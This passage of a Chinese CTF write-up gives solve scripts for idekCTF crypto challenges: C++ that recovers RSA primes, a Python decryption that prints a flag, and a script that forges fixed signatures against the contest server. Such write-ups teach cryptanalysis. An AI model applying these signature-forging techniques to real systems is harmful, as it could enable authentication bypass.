+<span class="hljs-keyword">using</span> ll = <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>;
+<span class="hljs-keyword">using</span> vint = vector&lt;<span class="hljs-keyword">int</span>&gt;;
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+
+<span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">read</span><span class="hljs-params">()</span> </span>{
+  <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>, f = <span class="hljs-number">1</span>; <span class="hljs-keyword">char</span> ch = <span class="hljs-built_in">getchar</span>();
+  <span class="hljs-keyword">for</span> (; ch &lt; <span class="hljs-string">&#x27;0&#x27;</span> || ch &gt; <span class="hljs-string">&#x27;9&#x27;</span>; ch = <span class="hljs-built_in">getchar</span>()) <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;-&#x27;</span>) f = <span class="hljs-number">-1</span>;
+  <span class="hljs-keyword">for</span> (; ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="hljs-string">&#x27;9&#x27;</span>; ch = <span class="hljs-built_in">getchar</span>()) x = x * <span class="hljs-number">10</span> + ch - <span class="hljs-string">&#x27;0&#x27;</span>;
+  <span class="hljs-keyword">return</span> x * f;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+  FILE *f = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;pq.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+  <span class="hljs-function">vector&lt;ll&gt; <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-number">10000000</span>)</span>, <span class="hljs-title">q</span><span class="hljs-params">(<span class="hljs-number">10000000</span>)</span></span>;
+  ll x, y;
+  <span class="hljs-keyword">int</span> n = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">&quot;%lld%lld&quot;</span>, &amp;x, &amp;y) != EOF) {
+    p[n] = x;
+    q[n] = y;
+    ++n;
+  }
+  <span class="hljs-built_in">fclose</span>(f);
+  f = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;mat1.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+  <span class="hljs-function">vector&lt;ll&gt; <span class="hljs-title">mat1</span><span class="hljs-params">(<span class="hljs-number">512</span>)</span>, <span class="hljs-title">mat2</span><span class="hljs-params">(<span class="hljs-number">512</span>)</span></span>;
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) {
+    ll x = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">47</span>; j++) {
+      ll bit;
+      <span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">&quot;%lld&quot;</span>, &amp;bit);
+      x |= bit &lt;&lt; j;
+    }
+    mat1[i] = x;
+  }
+  <span class="hljs-built_in">fclose</span>(f);
+  f = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;mat2.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) {
+    ll x = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">47</span>; j++) {
+      ll bit;
+      <span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">&quot;%lld&quot;</span>, &amp;bit);
+      x |= bit &lt;&lt; j;
+    }
+    mat2[i] = x;
+  }
+  <span class="hljs-built_in">fclose</span>(f);
+  <span class="hljs-built_in">reverse</span>(mat1.<span class="hljs-built_in">begin</span>(), mat1.<span class="hljs-built_in">end</span>());
+  <span class="hljs-built_in">reverse</span>(mat2.<span class="hljs-built_in">begin</span>(), mat2.<span class="hljs-built_in">end</span>());
+  vector&lt;ll&gt; l;
+  vector&lt;pair&lt;ll, ll&gt;&gt; B;
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">23</span>; i++)
+    l.<span class="hljs-built_in">push_back</span>(mat1[i]);
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">24</span>; i++)
+    l.<span class="hljs-built_in">push_back</span>(mat2[i]);
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">47</span>; i++) {
+    ll x = l[i];
+    ll p = <span class="hljs-number">1ll</span> &lt;&lt; i;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> num : B) {
+      ll y = num.first, pos = num.second;
+      <span class="hljs-keyword">if</span> ((y ^ x) &lt; x) {
+        x ^= y;
+        p ^= pos;
+      }
+    }
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;num : B) {
+      ll y = num.first;
+      <span class="hljs-keyword">if</span> ((y ^ x) &lt; y) {
+        num.first ^= x;
+        num.second ^= p;
+      }
+    }
+    <span class="hljs-built_in">assert</span>(x);
+    B.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">make_pair</span>(x, p));
+  }
+  vector&lt;vector&lt;<span class="hljs-keyword">int</span>&gt;&gt; <span class="hljs-built_in">posp</span>(<span class="hljs-number">512</span>, vector&lt;<span class="hljs-keyword">int</span>&gt;()), <span class="hljs-built_in">posq</span>(<span class="hljs-number">512</span>, vector&lt;<span class="hljs-keyword">int</span>&gt;());
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) {
+    ll x = mat1[i];
+    ll p = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">47</span>; j++)
+      <span class="hljs-keyword">if</span> (x &amp; B[j].first)
+        p ^= B[j].second;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">47</span>; j++)
+      <span class="hljs-keyword">if</span> ((p &gt;&gt; j) &amp; <span class="hljs-number">1</span>)
+        posp[i].<span class="hljs-built_in">push_back</span>(j);
+    ll check = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x : posp[i])
+      check ^= l[x];
+    <span class="hljs-built_in">assert</span>(check == x);
+  }
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) {
+    ll x = mat2[i];
+    ll p = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">47</span>; j++)
+      <span class="hljs-keyword">if</span> (x &amp; B[j].first)
+        p ^= B[j].second;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">47</span>; j++)
+      <span class="hljs-keyword">if</span> ((p &gt;&gt; j) &amp; <span class="hljs-number">1</span>)
+        posq[i].<span class="hljs-built_in">push_back</span>(j);
+    ll check = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x : posq[i])
+      check ^= l[x];
+    <span class="hljs-built_in">assert</span>(check == x);
+  }
+
+  <span class="hljs-comment">// this file could be 8.6G big!</span>
+  f = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;real_pq.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);
+  vector&lt;<span class="hljs-keyword">int</span>&gt; _l(<span class="hljs-number">47</span>);
+
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {
+    ll _p = p[i], _q = q[i];
+    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">100000</span> == <span class="hljs-number">0</span>)
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">23</span>; j++)
+      _l[j] = (_p &gt;&gt; j) &amp; <span class="hljs-number">1</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">24</span>; j++)
+      _l[j + <span class="hljs-number">23</span>] = (_q &gt;&gt; j) &amp; <span class="hljs-number">1</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">511</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
+      <span class="hljs-keyword">int</span> bit_p = <span class="hljs-number">0</span>;
+      <span class="hljs-keyword">for</span> (ll x : posp[i]) {
+        bit_p ^= _l[x];
+      }
+      <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span> + bit_p);
+      <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">23</span>) {
+        <span class="hljs-built_in">assert</span>(bit_p == _l[i]);
+      }
+    }
+    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot; &quot;</span>);
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">511</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
+      <span class="hljs-keyword">int</span> bit_q = <span class="hljs-number">0</span>;
+      <span class="hljs-keyword">for</span> (ll x : posq[i])
+        bit_q ^= _l[x];
+      <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span> + bit_q);
+      <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">24</span>) {
+        <span class="hljs-built_in">assert</span>(bit_q == _l[i + <span class="hljs-number">23</span>]);
+      }
+    }
+    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n&quot;</span>);
+  }
+  <span class="hljs-built_in">fclose</span>(f);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre><pre class="hljs"><code>p = <span class="hljs-number">8148641146281585626599965707019875487540363795516672614500530970713004312213378852992447549855928600229171345524388095399807768385341698813126095446000969</span>
+q = <span class="hljs-number">9595401536948702154260950703331322993513137152314157248261000347717193558940157103084976690783331034882701052399602064548436624663369151807143327408382209</span>
+enc = <span class="hljs-number">39952631182502523101053953538875437560829302998610236142339435591980522271590392249355510253125310494063081880512061476177621613835835483055753316172267380484804011034657479491794064534740537749793563744927827732170347495398050941609682485707331552759412916426691849669362897656967530464847648838434750188588</span>
+phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
+e = inverse(<span class="hljs-number">0x10001</span>, phi)
+m = <span class="hljs-built_in">pow</span>(enc, e, p*q)
+<span class="hljs-built_in">print</span>(long_to_bytes(m))
+<span class="hljs-comment"># b&#x27;idek{th3_prim3_g3n3r4ti0n_is_c001_but_n0t_s3cur3_QAQ}\n&#x27;</span></code></pre><h3 id="psychophobia"><a class="header-link" href="#psychophobia"></a>Psychophobia:</h3>
+<p>s大概会差<code>O//8</code>的k倍(k&lt;8)，修复后的si，发现<code>GCD(si, O)==4</code>或者<code>GCD(si, O)==8</code>都是唯一的，能够通过的s都是二者之一，并且这两个数的i存在<code>i2-i1=4</code>,即存在<code>(0,4),(1,5),(2,6),(3,7)</code>这几种选择可能(例如k=1时如果GCD(s1,O)==4,那么GCD(s5,O)==8)。那么分析<code>k=0，GCD(s0, O)==4</code>，<code>k=4, GCD(s4, O)==8</code>的频率，以此类推k=1..8，gcd=4,8。再分析对应i和gcd情况下的选择（0可以排除掉，对应的一定选4，例如将）。该题目中测试结果为当<code>GCD(s1, O)==4</code>时大概率s1为正确解，当<code>GCD(s1, O)==8</code>时大概率s5为正确解。当<code>GCD(s2, O)==4</code>时大概率s6为正确解，当<code>GCD(s2, O)==8</code>时大概率s2为正确解。当<code>GCD(s3, O)==4</code>时大概率s3为正确解，当<code>GCD(s3, O)==8</code>时大概率s7为正确解。大概有70%的概率fix正确，多跑几次即可。</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256
+<span class="hljs-keyword">from</span> netcat <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> ast <span class="hljs-keyword">import</span> literal_eval
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fix</span>(<span class="hljs-params">r, s</span>):</span>
+    rs = <span class="hljs-number">0</span>
+    idx = []
+    gcds = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
+        si = (s + i * (O // <span class="hljs-number">8</span>)) % O
+        u1 = (h * inverse(si, O)) % O
+        u2 = (r * inverse(si, O)) % O
+        <span class="hljs-keyword">if</span> GCD(si, O) == <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> GCD(si, O) == <span class="hljs-number">8</span>:
+            idx.append(i)
+            gcds.append(GCD(si, O))
+    <span class="hljs-keyword">if</span> idx[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>:
+        x = idx[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">elif</span> idx[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:
+        <span class="hljs-keyword">if</span> gcds[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:
+            x = idx[<span class="hljs-number">0</span>]
+        <span class="hljs-keyword">else</span>:
+            x = idx[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">elif</span> idx[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:
+        <span class="hljs-keyword">if</span> gcds[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:
+            x = idx[<span class="hljs-number">1</span>]
+        <span class="hljs-keyword">else</span>:
+            x = idx[<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">elif</span> idx[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span>:
+        <span class="hljs-keyword">if</span> gcds[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:
+            x = idx[<span class="hljs-number">0</span>]
+        <span class="hljs-keyword">else</span>:
+            x = idx[<span class="hljs-number">1</span>]
+    fix_s = (s + x * (O // <span class="hljs-number">8</span>)) % O
+    <span class="hljs-keyword">return</span> fix_s
+
+P = <span class="hljs-number">2</span>**<span class="hljs-number">255</span> - <span class="hljs-number">19</span>
+A = <span class="hljs-number">486662</span>
+B = <span class="hljs-number">1</span>
+<span class="hljs-comment"># Order of the Curve</span>
+O = <span class="hljs-number">57896044618658097711785492504343953926856930875039260848015607506283634007912</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    host, port = <span class="hljs-string">&#x27;psychophobia.chal.idek.team 1337&#x27;</span>.split(<span class="hljs-string">&#x27; &#x27;</span>)
+    io = remote(host, <span class="hljs-built_in">int</span>(port))
+    io.recvuntil(<span class="hljs-string">b&quot;|    &gt; &quot;</span>)
+    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)
+    msg = <span class="hljs-string">&quot;1 here, requesting flag for pick-up.&quot;</span>
+    h = <span class="hljs-built_in">int</span>.from_bytes(sha256(msg.encode()).digest(), <span class="hljs-string">&#x27;big&#x27;</span>)
+    <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;round-<span class="hljs-subst">{<span class="hljs-built_in">round</span>}</span>&quot;</span>)
+        io.recvuntil(<span class="hljs-string">b&#x27;Please fix :: &#x27;</span>)
+        tmp = io.recvline()
+        sig = literal_eval(tmp.strip().decode())
+        r, s = sig
+        fix_s = fix(r, s)
+        io.recvuntil(<span class="hljs-string">b&#x27;|    &gt; (r,s) &#x27;</span>)
+        io.sendline(<span class="hljs-string">f&#x27;<span class="hljs-subst">{r}</span>,<span class="hljs-subst">{fix_s}</span>&#x27;</span>.encode())
+
+    io.recvuntil(<span class="hljs-string">b&quot;signatures!\n&quot;</span>)
+    io.recvline()
+    tmp = io.recvline()
+    <span class="hljs-built_in">print</span>(tmp)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;{&quot;</span> <span class="hljs-keyword">in</span> tmp:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get flag!&quot;</span>)
+        io.close()
+        <span class="hljs-built_in">input</span>()
+    <span class="hljs-keyword">else</span>:
+        io.close()</code></pre><h2 id="结语"><a class="header-link" href="#结语"></a>结语</h2>
+<p>剩下的三个web和四个密码之后我们会复现整理后再推出相关的文章与大家一起交流学习.敬请期待,如果有什么问题欢迎发邮件询问</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
